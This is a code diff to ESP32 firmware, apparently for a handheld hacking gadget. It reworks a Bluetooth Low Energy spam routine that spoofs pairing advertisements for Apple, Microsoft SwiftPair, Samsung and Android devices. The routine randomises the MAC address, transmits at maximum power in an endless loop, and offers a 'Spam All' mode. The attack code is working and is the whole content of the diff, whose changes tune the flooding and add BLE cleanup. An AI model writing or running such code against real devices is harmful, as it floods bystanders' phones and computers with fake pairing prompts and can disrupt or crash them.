@@ -416,62 +416,80 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
 
   return AdvData;
 }
-  //// https://github.com/Spooks4576
+  //// https://github.com/Spooks4576 + github.com/dapsvi
 void executeSpam(EBLEPayloadType type) {
-  uint8_t macAddr[6];
-  if(type != Apple) {
+  static bool bleInitialized = false; // Track BLE state
+
+  if (type != Apple) {
+    uint8_t macAddr[6];
     generateRandomMac(macAddr);
     esp_base_mac_addr_set(macAddr);
   }
-  BLEDevice::init("");
-  delay(10);
-  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
-  pAdvertising = BLEDevice::getAdvertising();
-  delay(40);
-  BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
-  BLEAdvertisementData oScanResponseData = BLEAdvertisementData();
-  pAdvertising->setAdvertisementData(advertisementData);
-  pAdvertising->setScanResponseData(oScanResponseData);
-  //pAdvertising->setAdvertisementType(ADV_TYPE_IND);
-  pAdvertising->start();
-  delay(50);
 
+  // Initialize BLE only if not already initialized
+  if (!bleInitialized) {
+    BLEDevice::init("");
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
+    bleInitialized = true;
+  }
+
+  pAdvertising = BLEDevice::getAdvertising();
+
+  
+  BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
+  pAdvertising->setAdvertisementData(advertisementData);
+  pAdvertising->setScanResponseData(BLEAdvertisementData());
+
+  pAdvertising->start();
+  delay(5);
   pAdvertising->stop();
-  delay(10);
-  BLEDevice::deinit();
 }
 
-void aj_adv(int ble_choice){
-  int mael = 0;
-  int timer = 0;
-  int count = 0;
-  timer = millis();
-  while(1) {
-    if(millis()-timer >900) {
+void cleanupBLE() {
+  static bool bleInitialized = true;
 
-      switch(ble_choice){
+  if (bleInitialized) {
+    if (pAdvertising != nullptr) {
+      pAdvertising->stop();
+      pAdvertising = nullptr;
+    }
+    BLEDevice::deinit();
+    bleInitialized = false;
+  }
+}
+
+
+// github.com/dapsvi
+void aj_adv(int ble_choice) {
+  int mael = 0;
+  int timer = millis();
+  int count = 0;
+  
+  while (true) {
+    if (millis() - timer > 900) {
+      switch (ble_choice) {
         case 0: // Applejuice
           displayTextLine("iOS Spam (" + String(count) + ")");
           executeSpam(Apple);
           break;
         case 1: // SwiftPair
-          displayTextLine("SwiftPair  (" + String(count) + ")");
+          displayTextLine("SwiftPair (" + String(count) + ")");
           executeSpam(Microsoft);
           break;
         case 2: // Samsung
-          displayTextLine("Samsung  (" + String(count) + ")");
+          displayTextLine("Samsung (" + String(count) + ")");
           executeSpam(Samsung);
           break;
         case 3: // Android
-          displayTextLine("Android  (" + String(count) + ")");
+          displayTextLine("Android (" + String(count) + ")");
           executeSpam(Google);
           break;
-        case 4: // Tutti-frutti
-          displayTextLine("Spam All  (" + String(count) + ")");
-          if(mael == 0) executeSpam(Google);
-          if(mael == 1) executeSpam(Samsung);
-          if(mael == 2) executeSpam(Microsoft);
-          if(mael == 3) {
+        case 4: // Tutti-frutti (Spam All)
+          displayTextLine("Spam All (" + String(count) + ")");
+          if (mael == 0) executeSpam(Google);
+          if (mael == 1) executeSpam(Samsung);
+          if (mael == 2) executeSpam(Microsoft);
+          if (mael == 3) {
             executeSpam(Apple);
             mael = 0;
           }
@@ -481,16 +499,12 @@ void aj_adv(int ble_choice){
       timer = millis();
     }
 
-    if(check(EscPress)) {
-      returnToMenu=true;
+    if (check(EscPress)) {
+      returnToMenu = true;
+      cleanupBLE();
       break;
     }
   }
 
-  BLEDevice::init("");
-  delay(100);
-  pAdvertising = nullptr;
-  delay(100);
-  BLEDevice::deinit();
-
+  cleanupBLE();
 }
